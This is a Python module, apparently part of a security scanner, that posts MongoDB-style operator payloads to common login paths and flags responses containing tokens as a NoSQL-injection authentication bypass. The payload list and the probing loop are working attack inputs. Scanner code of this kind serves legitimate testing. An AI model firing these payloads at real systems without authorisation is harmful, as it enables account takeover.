"""NoSQL injection (MongoDB-style operator payloads)."""
from .base import BaseCheck
from ..models import Finding
from ..utils import run


class NoSQLInjectionCheck(BaseCheck):
    """Probe JSON-accepting endpoints with Mongo-style operators."""

    name = "NoSQL Injection"
    description = "Test APIs for MongoDB-style NoSQL injection"

    LOGIN_PATHS = [
        "/api/login", "/api/auth/login", "/api/v1/login", "/login",
        "/api/users/login", "/auth", "/signin",
    ]

    NOSQL_PAYLOADS = [
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"username": "admin", "password": {"$regex": ".*"}}',
    ]

    SUCCESS_INDICATORS = [
        '"token":', '"access_token":', '"session":', '"jwt":',
        '"success":true', '"authenticated":true', '"login":true',
    ]

    def execute(self) -> list[Finding]:
        for base in self._hosts():
            for path in self.LOGIN_PATHS:
                url = f"{base}{path}"
                for payload in self.NOSQL_PAYLOADS:
                    rc, body, _ = run(
                        ["curl", "-s", "--max-time", "6",
                         "-X", "POST",
                         "-H", "Content-Type: application/json",
                         "-d", payload, url],
                        timeout=10,
                    )
                    if rc != 0 or not body or len(body) < 10:
                        continue
                    body_lower = body.lower()
                    for indicator in self.SUCCESS_INDICATORS:
                        if indicator in body_lower:
                            self.findings.append(Finding(
                                severity="critical",
                                title="NoSQL Injection - Authentication Bypass",
                                host=base,
                                detail=f"MongoDB operator payload bypasses auth at {url}",
                                source="nosql_injection",
                                url=url,
                                evidence=payload,
                            ))
                            return self.findings
        return self.findings
